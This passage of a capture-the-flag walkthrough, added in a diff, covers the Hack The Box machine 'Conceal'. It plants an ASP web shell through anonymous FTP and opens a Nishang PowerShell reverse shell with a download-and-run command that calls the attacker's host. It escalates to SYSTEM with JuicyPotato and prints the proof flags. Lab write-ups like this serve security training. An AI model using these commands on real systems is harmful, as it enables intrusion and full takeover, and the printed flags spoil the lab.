+        Create a local <code>test.txt</code> file.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/80#&nbsp;echo&nbsp;"hey"&nbsp;&gt;&nbsp;test.txt
+            </div>
+        </div><br>
+        <br>
+        And upload it with <code>put</code>.<br>
+            <div class="codebox">
+                ftp&gt;&nbsp;put&nbsp;test.txt<br>
+                local:&nbsp;test.txt&nbsp;remote:&nbsp;test.txt<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                5&nbsp;bytes&nbsp;sent&nbsp;in&nbsp;0.00&nbsp;secs&nbsp;(39.0625&nbsp;kB/s)
+            </div>
+        </div><br>
+        <br>
+        We can upload files :) which will prove useful.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) 80/http</strong></h2><br>
+        The website can be used to access the files you upload via FTP.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>6a) gobuster</strong></h3><br>
+        If you <code>gobuster</code> the web site, you'll find an <code>/upload</code> directory where you can access your uploaded ftp files.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/80#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.116&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt&nbsp;-o&nbsp;gb-common.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.116/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/09/12&nbsp;15:03:28&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.116/upload&nbsp;(Status:&nbsp;301)<br>
+                =====================================================<br>
+                2019/09/12&nbsp;15:04:55&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        In <code>http://10.10.10.116/upload</code>, there exists the <code>test.txt</code> we uploaded eariler.<br>
+        (if it's not there, it's because the directory gets cleared out every few minutes. re-upload if your file disappears)<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>6b) Web Shell - .asp or .aspx tes</strong></h3><br>
+        Our goal now is to get a web shell.<br>
+        Considering this is an IIS server, we should first check if we can run <code>.asp</code> or <code>.aspx</code>.<br>
+        <br>
+        Make a copy of <code>test.txt</code> as a <code>.asp</code> file and a <code>.aspx</code> file.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/80#&nbsp;cp&nbsp;test.txt&nbsp;test.asp<br>
+                root@gotham:~/ctf/conceal/80#&nbsp;cp&nbsp;test.txt&nbsp;test.aspx
+            </div>
+        </div><br>
+        <br>
+        And upload both of them to the web server via ftp.<br>
+            <div class="codebox">
+                [...]<br>
+                ftp&gt;&nbsp;put&nbsp;test.asp<br>
+                ftp&gt;&nbsp;put&nbsp;test.aspx
+            </div>
+        </div><br>
+        <br>
+        We see them in both in <code>/upload</code>.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <code>.asp</code> works fine.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        But <code>.aspx</code> returns an extension configuration error.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Therefore, to get a web shell, we'll upload a <code>.asp</code> file!<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>6c) .asp Web Shell</strong></h3><br>
+        The standard Kali <code>.asp</code> web shell in <code>/usr/share/webshells/asp/</code> produces an error.<br>
+        <br>
+        Nmap reported that the IIS server is version 10, so I went to look for a more recent <code>.asp</code> web shell (<code>cmdasp.asp</code> in <code>/usr/share/webshells/asp</code> is from 2000),<br>
+        <br>
+        According to the author, this <code>.asp</code> web shell works on newer IIS versions.<br>
+        <a href="https://github.com/tennc/webshell/blob/master/asp/webshell.asp">https://github.com/tennc/webshell/blob/master/asp/webshell.asp</a><br>
+        <br>
+        Download the web shell and upload it via ftp.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/80#&nbsp;wget&nbsp;https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                [...]<br>
+                ftp&gt;&nbsp;put&nbsp;webshell.asp<br>
+                local:&nbsp;webshell.asp&nbsp;remote:&nbsp;webshell.asp<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                1407&nbsp;bytes&nbsp;sent&nbsp;in&nbsp;0.00&nbsp;secs&nbsp;(6.4511&nbsp;MB/s)
+            </div>
+        </div><br>
+        <br>
+        Browse to the uploaded web shell at <code>http://10.10.10.116/upload/webshell.asp</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        You can run some general system recon here, and then move to get an interactive shell.<br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) PowerShell Reverse Shell</strong></h2><br>
+        I used Nishang's <code>Invoke-PowerShellTcp.ps1</code> script to get a reverse shell on the box.<br>
+        <br>
+        Download Nishang's <code>Invoke-PowerShellTcp.ps1</code> script - <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/nishang#&nbsp;wget&nbsp;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Edit <code>Invoke-PowerShellTcp.ps1</code> and write the IP and port of your attacking machine for the shell to connect to at the bottom of the script.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/nishang#&nbsp;nano&nbsp;Invoke-PowerShellTcp.ps1&nbsp;<br>
+                ...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;catch<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Warning&nbsp;"Something&nbsp;went&nbsp;wrong!&nbsp;Check&nbsp;if&nbsp;the&nbsp;server&nbsp;is&nbsp;reachable&nbsp;and&nbsp;you&nbsp;are&nbsp;using&nbsp;the&nbsp;correct&nbsp;port."<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Error&nbsp;$_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                }<br>
+                <br>
+                Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.25&nbsp;-Port&nbsp;9001
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine to receive the shell.<br>
+            <div class="codebox">
+                root@gotham:~#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Serve Nishang's <code>PowerShellTcp.ps1</code> script to the target using <code>python -m SimpleHTTPServer</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/nishang#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Send a command via the <code>webshell.asp</code> web shell that downloads Nishang's PowerShell script from your attacking machihne and executes it.<br>
+        <code>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8000/Invoke-PowerShellTcp.ps1')"</code><br>
+        <br>
+        If the command ran successfully on the webshell, you should have a shell on your listener.<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.25]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.116]&nbsp;49674<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;CONCEAL$&nbsp;on&nbsp;CONCEAL<br>
+                Copyright&nbsp;(C)&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C:\Windows\SysWOW64\inetsrv&gt;whoami<br>
+                conceal\destitute<br>
+                PS&nbsp;C:\Windows\SysWOW64\inetsrv&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) whoami /all</strong></h2><br>
+        Check the full extent of your privileges using <code>whoami /all</code>.<br>
+        SeImpersonatePrivilege is enabled, which means that we can use JuicyPotato to elevate our privileges.<br>
+            <div class="codebox">
+                PS&nbsp;C:\Windows\SysWOW64\inetsrv&gt;whoami&nbsp;/all<br>
+                [...]<br>
+                PRIVILEGES&nbsp;INFORMATION<br>
+                ----------------------<br>
+                <br>
+                Privilege&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;<br>
+                =============================&nbsp;=========================================&nbsp;<br>
+                SeAssignPrimaryTokenPrivilege&nbsp;&nbsp;Replace&nbsp;a&nbsp;process&nbsp;level&nbsp;token&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeIncreaseQuotaPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Adjust&nbsp;memory&nbsp;quotas&nbsp;for&nbsp;a&nbsp;process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeShutdownPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Shut&nbsp;down&nbsp;the&nbsp;system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeAuditPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generate&nbsp;security&nbsp;audits&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeChangeNotifyPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bypass&nbsp;traverse&nbsp;checking&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled&nbsp;<br>
+                SeUndockPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remove&nbsp;computer&nbsp;from&nbsp;docking&nbsp;station&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeImpersonatePrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Impersonate&nbsp;a&nbsp;client&nbsp;after&nbsp;authentication&nbsp;Enabled&nbsp;<br>
+                SeIncreaseWorkingSetPrivilege&nbsp;Increase&nbsp;a&nbsp;process&nbsp;working&nbsp;set&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+                SeTimeZonePrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Change&nbsp;the&nbsp;time&nbsp;zone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) JuicyPotato.exe setup</strong></h2><br>
+        JuicyPotato is available here - <a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br>
+        <br>
+        RottenPotatoNG is the original version of JuicyPotato.<br>
+        RottenPotatoNG, when you have <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges, exploits a privilege escalation chain based on the BITS (Background Intelligent Transfer Service) service having a MiTM listener on 127.0.0.1:6666.<br>
+        <br>
+        JuicyPotato expands upon RottenPotatoNG.<br>
+        <em>Apparently it doesn't work on 1809</em>.<br>
+        <br>
+        To get a shell with JuicyPotato, we'll create a .bat script which downloads Nishang's Invoke-PowerShellTcp.ps1 script from our attacking server and executes it. The .bat script will run as SYSTEM, and we should get a SYSTEM shell on our listener.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>9a) Upload .bat script</strong></h3><br>
+        Create a <code>.bat</code> script which includes the command that JuicyPotato will run as SYSTEM.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/ftp#&nbsp;nano&nbsp;adminshell.bat<br>
+                powershell&nbsp;"IEX(New-Object&nbsp;Net.WebClient).downloadString('http://10.10.14.25:8000/Invoke-PowerShellTcp.ps1')"
+            </div>
+        </div><br>
+        <br>
+        Upload it to target system using ftp.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/21ftp#&nbsp;ftp&nbsp;10.10.10.116<br>
+                Connected&nbsp;to&nbsp;10.10.10.116.<br>
+                220&nbsp;Microsoft&nbsp;FTP&nbsp;Service<br>
+                Name&nbsp;(10.10.10.116:root):&nbsp;anonymous<br>
+                331&nbsp;Anonymous&nbsp;access&nbsp;allowed,&nbsp;send&nbsp;identity&nbsp;(e-mail&nbsp;name)&nbsp;as&nbsp;password.<br>
+                Password:<br>
+                [...]<br>
+                ftp&gt;&nbsp;put&nbsp;adminshell.bat&nbsp;
+            </div>
+        </div><br>
+        <br>
+        And on your reverse shell, copy the <code>.bat</code> into a directory you can write to (just to be safe).<br>
+        I chose <code>destitute</code>'s Documents folder.<br>
+            <div class="codebox">
+                PS&nbsp;C:\Windows\SysWOW64\inetsrv&gt;&nbsp;cd&nbsp;\users\destitute\documents<br>
+                PS&nbsp;C:\users\destitute\documents&gt;&nbsp;cp&nbsp;\inetpub\wwwroot\upload\adminshell.bat&nbsp;.
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>9b) Upload JuicyPotato.exe</strong></h3><br>
+        Download JuicyPotato.exe from the releases page on github<br>
+        <a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a><br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/21ftp#&nbsp;wget&nbsp;https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Log in to the ftp server and set the file transfer mode to <code>binary</code>, and upload the file.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/21ftp#&nbsp;ftp&nbsp;10.10.10.116<br>
+                Connected&nbsp;to&nbsp;10.10.10.116.<br>
+                220&nbsp;Microsoft&nbsp;FTP&nbsp;Service<br>
+                Name&nbsp;(10.10.10.116:root):&nbsp;anonymous<br>
+                331&nbsp;Anonymous&nbsp;access&nbsp;allowed,&nbsp;send&nbsp;identity&nbsp;(e-mail&nbsp;name)&nbsp;as&nbsp;password.<br>
+                Password:<br>
+                230&nbsp;User&nbsp;logged&nbsp;in.<br>
+                Remote&nbsp;system&nbsp;type&nbsp;is&nbsp;Windows_NT.<br>
+                ftp&gt;&nbsp;binary<br>
+                200&nbsp;Type&nbsp;set&nbsp;to&nbsp;I.<br>
+                ftp&gt;&nbsp;put&nbsp;JuicyPotato.exe
+            </div>
+        </div><br>
+        <br>
+        On your reverse shell, copy the exe to where your adminshell.bat script is.<br>
+        I'm in <code>destitute</code>'s Documents folder.<br>
+            <div class="codebox">
+                PS&nbsp;C:\users\destitute\documents&gt;&nbsp;cp&nbsp;\inetpub\wwwroot\upload\JuicyPotato.exe&nbsp;.
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>10) JuicyPotato.exe</strong></h2><br>
+        Start a listener on your attacking machine to receive the SYSTEM shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Serve the <code>Invoke-PowerShellTcp.ps1</code> script that the <code>.bat</code> script will run using <code>python -m SimpleHTTPServer</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run JuicyPotato.exe<br>
+        <code>-t *</code> - to try both CreateProcessWithTokenW and CreateProcessAsUser create process calls<br>
+        <code>-p</code> - to specify the program/command to run<br>
+        <code>-l</code> - to specify a random COM port to listen on<br>
+        <br>
+            <div class="codebox">
+                PS&nbsp;C:\users\destitute\documents&gt;&nbsp;.\JuicyPotato.exe&nbsp;-t&nbsp;*&nbsp;-p&nbsp;adminshell.bat&nbsp;-l&nbsp;6767<br>
+                Testing&nbsp;{4991d34b-80a1-4291-83b6-3328366b9097}&nbsp;6767<br>
+                COM&nbsp;-&gt;&nbsp;recv&nbsp;failed&nbsp;with&nbsp;error:&nbsp;10038
+            </div>
+        </div><br>
+        <br>
+        JuicyPotato errors.<br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>10a) Different CLSID</strong></h3><br>
+        If JuicyPotato errors, try a different CLSID - <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br>
+        Windows 10 Professional - <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro">https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro</a><br>
+        <br>
+        wuaserv is the Windows Update Service, which should most definitely be installed.<br>
+        Grab its CLSID and try JuicyPotato again - <strong><code>{</code></strong><code>e60687f7-01a1-40aa-86ac-db1cbf673334}</code><br>
+        <br>
+            <div class="codebox">
+                PS&nbsp;C:\users\destitute\documents&gt;&nbsp;.\JuicyPotato.exe&nbsp;-t&nbsp;*&nbsp;-p&nbsp;adminshell.bat&nbsp;-l&nbsp;6789&nbsp;-c&nbsp;"{e60687f7-01a1-40aa-86ac-db1cbf673334}"<br>
+                Testing&nbsp;{e60687f7-01a1-40aa-86ac-db1cbf673334}&nbsp;6789<br>
+                ......<br>
+                [+]&nbsp;authresult&nbsp;0<br>
+                {e60687f7-01a1-40aa-86ac-db1cbf673334};NT&nbsp;AUTHORITY\SYSTEM<br>
+                <br>
+                [+]&nbsp;CreateProcessWithTokenW&nbsp;OK
+            </div>
+        </div><br>
+        <br>
+        It worked!<br>
+        <br>
+        You should see a <code>Invoke-PowerShellTcp.ps1</code> being retrieved from your web server.<br>
+            <div class="codebox">
+                [...]<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.116&nbsp;-&nbsp;-&nbsp;[13/Sep/2019&nbsp;14:31:14]&nbsp;"GET&nbsp;/Invoke-PowerShellTcp.ps1&nbsp;HTTP/1.1"&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        And a shell connect on your listener!<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.25]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.116]&nbsp;49778<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;CONCEAL$&nbsp;on&nbsp;CONCEAL<br>
+                Copyright&nbsp;(C)&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C:\Windows\system32&gt;whoami<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        Go grab user.txt and root.txt :)<br>
+            <div class="codebox">
+                PS&nbsp;C:\Windows\system32&gt;&nbsp;cat&nbsp;C:\Users\Destitute\Desktop\proof.txt<br>
+                6E9FDFE0DCB66E700FB9CB824AE5A6FF<br>
+                <br>
+                PS&nbsp;C:\Windows\system32&gt;&nbsp;cat&nbsp;C:\Users\Administrator\Desktop\proof.txt<br>
+                5737DD2EDC29B5B219BC43E60866BE08
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
